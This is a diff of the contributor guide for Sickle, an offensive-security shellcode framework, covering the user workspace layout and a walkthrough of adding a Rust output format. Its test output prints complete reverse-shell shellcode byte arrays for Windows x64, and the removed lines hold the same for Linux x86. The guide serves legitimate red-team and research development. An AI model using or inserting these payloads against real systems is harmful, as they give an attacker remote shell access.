@@ -2,16 +2,15 @@
 
 First off, thank you for taking the time to contribute to Sickle!
 
-All contributions are welcome, and I kindly ask that you follow a few guidelines specific to this project. To make it easier, I’ve included a *Table of Contents* in this document to help you navigate the contribution process, based on **Sickle v3.1.0**.
+All contributions are welcome, and I kindly ask that you follow a few guidelines specific to this project. To make it easier, I’ve included a *Table of Contents* in this document to help you navigate the contribution process, based on **Sickle v4.0.0**.
 
 Even if you don’t have time to contribute directly, simply using the project is a huge motivator to continue its development.
 
-If you’d like to show your support in other ways, consider:
+If you’d like to show your support in other ways, you can:
 
-- Starring the project
-- Tweeting about it
-- Spreading the word at local meetups
-- Becoming a sponsor
+- Star the project
+- X about it
+- Become a sponsor :)
 
 Ultimately, the fact that you’re here means you’re already a contributor, and I truly appreciate your support!
 
@@ -19,8 +18,10 @@ Ultimately, the fact that you’re here means you’re already a contributor, an
 
 - [Best Practices](#best-practices)
 - [Framework Layout](#framework-layout)
+  - [Your Workspace](#your-workspace)
 - [Adding a Format](#adding-a-format)
   - [Creating the Format](#creating-the-format)
+  - [Testing the Format](#testing-the-format)
 
 # Best Practices
 
@@ -45,51 +46,65 @@ drwxrwxr-x 4 wetw0rk wetw0rk 4096 Mar 28 09:54 payloads
 
 Let's break this down:
 
-- **common**: This directory contains handlers for Sickle's default operations and "standard libraries" used by payload/development modules. It's very rare you will be modifying contents within this directory as an operator since majority of updates to these files will be new features that affect the whole framework or simply bug fixes.
+- **common**: This directory contains "handlers" for Sickle's default operations and "standard libraries" used by payload and development modules. Very rarely will you be modifying contents within this directory since majority of updates to these files will be new features that affect the whole framework or simply bug fixes.
 
 - **formats**: This is where all formats supported by Sickle are stored (e.g *c, java, python*). Should you be using a custom wrapper in a new language not supported by Sickle this is where you would add it.
 
-- **modules**: This is where all development modules are stored, not to be confused with payload modules. Here is where new capabilities that assist in shellcode/payload development should be added (e.g *diff, run*).
+- **modules**: This is where all development modules are stored, not to be confused with payload modules. Here is where new capabilities that assist in development should be added (e.g *diff, run*).
 
-- **payloads**: This is where actual shellcode stubs should be stored. Depending on what platform you're using is what subdirectory you will use, this also includes architecture. Sickle is organized by platform, architecture, and name. For example if you wanted to add a Windows x86 Reverse Shell, you would place it under ***windows/x86/shell_reverse_tcp.py***.
+- **payloads**: This is where actual shellcode stubs should be stored. Depending what platform you're developing for is what subdirectories you will use. Sickle is organized by platform, architecture, and name. For example if you wanted to add a Windows x86 Reverse Shell, you would place it under ***windows/x86/shell_reverse_tcp.py***.
 
 Often the best way to begin module development, is by copying an existing file and going from there.
 
-# Adding a Format
+## Your Workspace
 
-Sickles current format support can be checked easily by running `sickle.py -l` or simply entering the respective directory.
+When running Sickle for the first time, a workspace for custom modules, formats, and payloads is automatically created for your user. This is done so you can safely add new features to Sickle without messing with the framework until you're ready to submit a pull request. Of course, this is also designed for those of you working as Red Team Operators who may not want to open source a custom stager.
+
+Within Linux this can be found under ***~/.local/share/sickle*** as shown below:
 
 ```
-$ sickle -l
+$ tree ~/.local/share/sickle                                                    
+/home/wetw0rk/.local/share/sickle
+├── formats
+├── modules
+└── payloads
+    ├── linux
+    │   ├── aarch64
+    │   ├── x64
+    │   └── x86
+    └── windows
+        ├── aarch64
+        ├── x64
+        └── x86
+```
 
-...snip...
+# Adding a Format
 
-  Format              Description
-  ------              -----------
-  c                   Format bytecode for a C application
-  java                Format bytecode for Java
-  hex                 Format bytecode in hex
-  num                 Format bytecode in num format
-  powershell          Format bytecode for Powershell
-  bash                Format bytecode for bash script (UNIX)
-  nasm                Format bytecode for NASM
-  raw                 Format bytecode to be written to stdout in raw form
-  python3             Format bytecode for Python3
-  cs                  Format bytecode for C#
-  python              Format bytecode for Python
-  uint8array          Format bytecode for Javascript as a Uint8Array directly
-  hex_space           Format bytecode in hex, seperated by a space
-  dword               Format bytecode in dword
-  escaped             Format bytecode for one-liner hex escape paste
-  javascript          Format bytecode for Javascript (Blob to send via XHR)
-  perl                Format bytecode for Perl
-  ruby                Format bytecode for Ruby
+Sickles current format support can be checked easily by running `sickle -l formats`.
 
-$ pwd
-/opt/Sickle/src/sickle
+```
+$ sickle -l formats
 
-$ ls formats
-__init__.py  bash.py  c.py  cs.py  dword.py  escaped.py  hex.py  hex_space.py  java.py  javascript.py  nasm.py  num.py  perl.py  powershell.py  python.py  python3.py  raw.py  ruby.py  uint8array.py
+  Format        Description
+  ------        -----------
+  python        Format bytecode for Python
+  bash          Format bytecode for bash script (UNIX)
+  javascript    Format bytecode for Javascript (Blob to send via XHR)
+  powershell    Format bytecode for Powershell
+  java          Format bytecode for Java
+  uint8array    Format bytecode for Javascript as a Uint8Array directly
+  num           Format bytecode in num format
+  raw           Format bytecode to be written to stdout in raw form
+  nasm          Format bytecode for NASM
+  c             Format bytecode for a C application
+  ruby          Format bytecode for Ruby
+  escaped       Format bytecode for one-liner hex escape paste
+  dword         Format bytecode in dword
+  hex_space     Format bytecode in hex, seperated by a space
+  cs            Format bytecode for C#
+  python3       Format bytecode for Python3
+  hex           Format bytecode in hex
+  perl          Format bytecode for Perl
 ```
 
 If this is your first time creating a format I recommend starting with *c.py* as this module is intentionally heavily documented as shown below:
@@ -156,94 +171,144 @@ class FormatModule():
 
 ## Creating the Format
 
-As previously mentioned the best way to begin is by copying the module (format module to be specific) *c.py* file to the format name you intend to add. For example, say we want to create a format for *mucky* lang (note this is fake language).
+As previously mentioned, the best way to begin is by copying the format to that of your intended target language. In this case *c.py* file to *rust.py*.
 
 ```
-$ cp c.py mucky.py
+$ cp sickle/formats/c.py ~/.local/share/sickle/formats/rust.py
 ```
 
-We can now begin modification of *mucky.py*. The first lines we want to modify are ***6-8*** these lines contain information that will be presented to the user when running `sickle -l`.
+We can now begin modification of *rust.py*. The first lines we want to modify are ***6-8*** these lines contain information that will be presented to the user when running ***sickle -l***.
 
 ```python
   6     author           = "wetw0rk"
-  7     format_name      = "mucky"
-  8     description      = "Format bytecode for a Mucky application"
+  7     format_name      = "rust"
+  8     description      = "Format bytecode for a Rust application"
 ```
 
-Next, we want to modify lines ***16-22***. These lines contain information respective to the language. It's important to modify them since modules such as **pinpoint** depend on this information.
+Next, we want to modify `self.language_info`. This variable contain information respective to the language. It's important to modify it since modules such as *pinpoint* depend on this information when parsing the language.
 
 ```python
  16         self.language_info = \
  17         {
- 18             "single line comment": '--- MUCKY [',
- 19             "multi line comment": ["MS", "ME"],
- 20             "opcode escape": "\\x",
- 21             "seperator": "",
+ 18             "single line comment": '//',
+ 19             "multi line comment": ["/*", "*/"],
+ 20             "opcode escape": "0x",
+ 21             "seperator": ",",
  22         }
 ```
 
-Next, we'll want to modify line ***43**, this line is responsible for how the byte array is instantiated.
+Since this language is unique we won't need the `from_raw_to_escaped()` function. Let's comment it out for now to practice "good programming habits". However, we will delete it later.
 
 ```python
- 42         if (single_line != True):
- 43             lines = ["mucky char {:s}[] = ".format(self.varname)]
- 44         else:
- 45             lines = []
+  2 #from sickle.common.lib.generic.convert import from_raw_to_escaped
 ```
 
-Next, mosify the seperation number on line **48** (proir was 14 for *c.py*). This is responsible for determining the amount of bytes per line.
+Next, we'll want to create an `op_str` variable. This will be the string that gets parsed by the `analyze_bytes()` function. Lucky for us *cs.py* (C# format) uses a very similiar format to rust so we can just copy and paste it into our new module.
 
 ```python
- 48         results = analyze_bytes(self.language_info, escaped_bytes, self.badchars, 15)
+def get_generated_lines(self, pinpoint=False, single_line=False):
+ 37 --snip--
+ 41
+ 42         op_str = ""
+ 43         try:
+ 44             split_badchar = self.badchars.split(',')
+ 45             for i in range(len(split_badchar)):
+ 46                 mod_badchars += "0x%s," % (split_badchar[i][2:])
+ 47                 self.badchars = mod_badchars.rstrip(',')
+ 48         except:
+ 49             pass
+ 50 
+ 51         for byte in bytearray(self.raw_bytes):
+ 52             op_str += "0x{:02x},".format(byte)
+ 53         
+ 54         if (single_line != True):
+ 52 --snip--
 ```
+
+Next, we'll want to modify the if condition checking the `single_line` variable, this line is responsible for how the byte array is instantiated.
+
+```python
+ 54         if (single_line != True):
+ 55             lines = ["let {:s}:[u8;{:d}] = [".format(self.varname, len(self.raw_bytes))]
+ 56         else:
+ 57             lines = []
+```
+
+Next, comment out the `escaped_bytes` variable. As prevously mentioned since this language is more complex than C/Python we will be using an `op_str` variable similiar to the C# format.
+
+```python
+ 59 #        escaped_bytes = from_raw_to_escaped(self.raw_bytes)
+```
+
+Next, modify the `analyze_bytes()` function. Here we swapped out the `escaped_bytes` variable for the newly created `op_str` variable and changed the `bytes_per_line` parameter used by `analyze_bytes()` to *15*.
+
+I've found that this is something you play with depending on how each byte is formatted.
+
+```python
+ 60         results = analyze_bytes(self.language_info, op_str, self.badchars, 15)
+```
+
+Finally, we'll want to modify how the `results` variable is output. This will also vary depending on the target language.
+
+```python
+ 61         for i in range(len(results)):
+ 62             snip = len(results[i]) - 1
+ 63             
+ 64             if ((i == (len(results)-1)) and single_line != True):
+ 65                 lines.append(results[i][:snip] + " ];")
+ 66             else:
+ 67                 lines.append(results[i])
+```
+
+If everything went well you should be able to generate a shellcode stub using the new format.
 
 ## Testing the Format
 
-We're now ready to test the format, there are many ways to do this however I will be using the `windows/x64/reflective_pe_tcp` payload currently in development for this example.
-
-
-```
-$ python3 sickle.py -p windows/x64/reflective_pe_tcp LHOST=192.168.81.144 LPORT=1337 -f mucky | head
---- MUCKY [ Bytecode generated by Sickle, size: 2790 bytes
-mucky char buf[] = 
-"\xe8\xd4\x09\x00\x00\x48\x89\xc7\x48\x83\xec\x08\x48\x81\xec"
-"\x00\x03\x00\x00\x49\x89\xe7\x48\xc7\xc2\xe6\x17\x8f\x7b\xe8"
-"\xe5\x09\x00\x00\x49\x89\x87\x88\x00\x00\x00\x48\xba\x8e\x4e"
-"\x0e\xec\x00\x00\x00\x00\xe8\xcf\x09\x00\x00\x49\x89\x87\x98"
-"\x00\x00\x00\x48\xc7\xc2\x9c\x95\x1a\x6e\xe8\xbc\x09\x00\x00"
-"\x49\x89\x47\x30\x48\xc7\xc2\xaa\xfc\x0d\x7c\xe8\xac\x09\x00"
-"\x00\x49\x89\x87\x10\x01\x00\x00\x48\xc7\xc2\x56\x87\xd9\x53"
-"\xe8\x99\x09\x00\x00\x49\x89\x87\x40\x01\x00\x00\x48\xc7\xc2"
-"\xdd\x9c\xbd\x72\xe8\x86\x09\x00\x00\x49\x89\x87\x60\x01\x00"
-
-$ python3 sickle.py -p windows/x64/reflective_pe_tcp LHOST=192.168.81.144 LPORT=1337 -f mucky -m pinpoint | head 
-"\xe8\xd4\x09\x00\x00"                     --- MUCKY [ call 0x19d9
-"\x48\x89\xc7"                             --- MUCKY [ mov rdi, rax
-"\x48\x83\xec\x08"                         --- MUCKY [ sub rsp, 8
-```
-
-Congratulations, you have successfully added a new format! Please keep in mind this was an extremely simple example. My reccomendation is to look at other formats should this byte sequence not match your target language.
-
-For example `num` and `java` follow an interesting "rule set".
+We're now ready to test the format, there are many ways to do this however I will be using the `windows/x64/shell_reverse_tcp` for this example.
 
 ```
-$ python3 sickle.py -p linux/x86/shell_reverse_tcp LHOST=192.168.81.144 LPORT=1337 -f dword       
-0xe3f7db31, 0x6a534353, 0xb0e18902, 0x9380cd66, 0xcd3fb059, 0xf9794980, 0x51a8c068, 0x00026890
-0xe1893905, 0x515066b0, 0x8903b353, 0x3180cde1, 0x2f6851c9, 0x6868732f, 0x6e69622f, 0x0bb0e389
-0x80
-
-$ python3 sickle.py -p linux/x86/shell_reverse_tcp LHOST=192.168.81.144 LPORT=1337 -f java 
-// Bytecode generated by Sickle, size: 66 bytes
-byte buf[] = new byte[]
-{
- (byte) 0x31, (byte) 0xdb, (byte) 0xf7, (byte) 0xe3, (byte) 0x53, (byte) 0x43, (byte) 0x53, (byte) 0x6a,
- (byte) 0x02, (byte) 0x89, (byte) 0xe1, (byte) 0xb0, (byte) 0x66, (byte) 0xcd, (byte) 0x80, (byte) 0x93,
- (byte) 0x59, (byte) 0xb0, (byte) 0x3f, (byte) 0xcd, (byte) 0x80, (byte) 0x49, (byte) 0x79, (byte) 0xf9,
- (byte) 0x68, (byte) 0xc0, (byte) 0xa8, (byte) 0x51, (byte) 0x90, (byte) 0x68, (byte) 0x02, (byte) 0x00,
- (byte) 0x05, (byte) 0x39, (byte) 0x89, (byte) 0xe1, (byte) 0xb0, (byte) 0x66, (byte) 0x50, (byte) 0x51,
- (byte) 0x53, (byte) 0xb3, (byte) 0x03, (byte) 0x89, (byte) 0xe1, (byte) 0xcd, (byte) 0x80, (byte) 0x31,
- (byte) 0xc9, (byte) 0x51, (byte) 0x68, (byte) 0x2f, (byte) 0x2f, (byte) 0x73, (byte) 0x68, (byte) 0x68,
- (byte) 0x2f, (byte) 0x62, (byte) 0x69, (byte) 0x6e, (byte) 0x89, (byte) 0xe3, (byte) 0xb0, (byte) 0x0b,
- (byte) 0xcd, (byte) 0x80,
-};
+$ sickle -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f rust                   
+// /usr/local/bin/sickle -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f rust
+// size: 564 bytes
+let buf:[u8;564] = [
+0x55,0x48,0x89,0xe5,0x48,0x81,0xec,0x20,0x01,0x00,0x00,0x48,0x83,0xe4,0xf0,
+0xe8,0x7f,0x01,0x00,0x00,0x48,0x89,0xc7,0x48,0xba,0x8e,0x4e,0x0e,0xec,0x00,
+0x00,0x00,0x00,0xe8,0xa0,0x01,0x00,0x00,0x48,0x89,0x45,0xf8,0x48,0xc7,0xc2,
+0x72,0xfe,0xb3,0x16,0xe8,0x90,0x01,0x00,0x00,0x48,0x89,0x45,0xf0,0x48,0xc7,
+0xc2,0x83,0xb9,0xb5,0x78,0xe8,0x80,0x01,0x00,0x00,0x48,0x89,0x45,0xe8,0x48,
+0xb9,0x57,0x73,0x32,0x5f,0x33,0x32,0x2e,0x64,0x48,0x89,0x4d,0xb0,0x66,0xb9,
+0x6c,0x6c,0x66,0x89,0x4d,0xb8,0x48,0x31,0xc9,0x88,0x4d,0xba,0x48,0x8d,0x4d,
+0xb0,0x48,0x8b,0x45,0xf8,0xff,0xd0,0x48,0x89,0xc7,0x48,0xc7,0xc2,0xcb,0xed,
+0xfc,0x3b,0xe8,0x47,0x01,0x00,0x00,0x48,0x89,0x45,0xe0,0x48,0xba,0xd9,0x09,
+0xf5,0xad,0x00,0x00,0x00,0x00,0xe8,0x34,0x01,0x00,0x00,0x48,0x89,0x45,0xd8,
+0x48,0xc7,0xc2,0xec,0xf9,0xaa,0x60,0xe8,0x24,0x01,0x00,0x00,0x48,0x89,0x45,
+0xd0,0x48,0xc7,0xc1,0x02,0x02,0x00,0x00,0x48,0x8d,0x55,0xa8,0x48,0x8b,0x45,
+0xe0,0xff,0xd0,0xb9,0x02,0x00,0x00,0x00,0xba,0x01,0x00,0x00,0x00,0x49,0xc7,
+0xc0,0x06,0x00,0x00,0x00,0x4d,0x31,0xc9,0x4c,0x89,0x4c,0x24,0x20,0x4c,0x89,
+0x4c,0x24,0x28,0x48,0x8b,0x45,0xd8,0xff,0xd0,0x48,0x89,0xc6,0x48,0x89,0xc1,
+0x49,0xc7,0xc0,0x10,0x00,0x00,0x00,0x48,0x8d,0x55,0xa0,0x49,0xb9,0x02,0x00,
+0x05,0x39,0x7f,0x00,0x00,0x01,0x4c,0x89,0x0a,0x4d,0x31,0xc9,0x4c,0x89,0x4a,
+0x08,0x48,0x8b,0x45,0xd0,0xff,0xd0,0x48,0x8d,0xbd,0x38,0xff,0xff,0xff,0x48,
+0x89,0xfb,0x31,0xc0,0xb9,0x1a,0x00,0x00,0x00,0xf3,0xab,0xb8,0x68,0x00,0x00,
+0x00,0x89,0x03,0xb8,0x00,0x01,0x00,0x00,0x89,0x43,0x3c,0x48,0x89,0x73,0x50,
+0x48,0x89,0x73,0x58,0x48,0x89,0x73,0x60,0x31,0xc9,0x48,0x89,0xea,0x48,0x8d,
+0x95,0x30,0xff,0xff,0xff,0x48,0x31,0xc0,0xb8,0x63,0x6d,0x64,0x00,0x48,0x89,
+0x02,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x31,0xc0,0xff,0xc0,0x48,0x89,0x44,0x24,
+0x20,0xff,0xc8,0x48,0x89,0x44,0x24,0x28,0x48,0x89,0x44,0x24,0x30,0x48,0x89,
+0x44,0x24,0x38,0x48,0x89,0x5c,0x24,0x40,0x48,0x8d,0x9d,0x28,0xff,0xff,0xff,
+0x48,0x89,0x5c,0x24,0x48,0x48,0x8b,0x45,0xf0,0xff,0xd0,0x48,0x31,0xc9,0x48,
+0xff,0xc9,0x48,0x31,0xd2,0x48,0x8b,0x45,0xe8,0xff,0xd0,0xc9,0xc3,0x55,0x48,
+0x89,0xe5,0xb2,0x4b,0x48,0xc7,0xc1,0x60,0x00,0x00,0x00,0x65,0x4c,0x8b,0x01,
+0x49,0x8b,0x78,0x18,0x48,0x8b,0x7f,0x10,0x48,0x31,0xc9,0x48,0x8b,0x47,0x30,
+0x48,0x8b,0x77,0x60,0x48,0x8b,0x3f,0x66,0x39,0x4e,0x18,0x75,0xec,0x38,0x16,
+0x75,0xe8,0xc9,0xc3,0x55,0x48,0x89,0xe5,0x8b,0x5f,0x3c,0x48,0x81,0xc3,0x88,
+0x00,0x00,0x00,0x48,0x01,0xfb,0x8b,0x03,0x48,0x89,0xfb,0x48,0x01,0xc3,0x8b,
+0x43,0x20,0x49,0x89,0xf8,0x49,0x01,0xc0,0x48,0x8b,0x4b,0x18,0x67,0xe3,0x43,
+0xff,0xc9,0x41,0x8b,0x04,0x88,0x48,0x89,0xfe,0x48,0x01,0xc6,0x4d,0x31,0xc9,
+0x48,0x31,0xc0,0xfc,0xac,0x84,0xc0,0x74,0x09,0x41,0xc1,0xc9,0x0d,0x49,0x01,
+0xc1,0xeb,0xf2,0x41,0x39,0xd1,0x75,0xd7,0x44,0x8b,0x43,0x24,0x49,0x01,0xf8,
+0x48,0x31,0xc0,0x66,0x41,0x8b,0x04,0x48,0x44,0x8b,0x43,0x1c,0x49,0x01,0xf8,
+0x41,0x8b,0x04,0x80,0x48,0x01,0xf8,0xc9,0xc3 ];
 ```
+
+Congratulations, you have successfully added a new format!
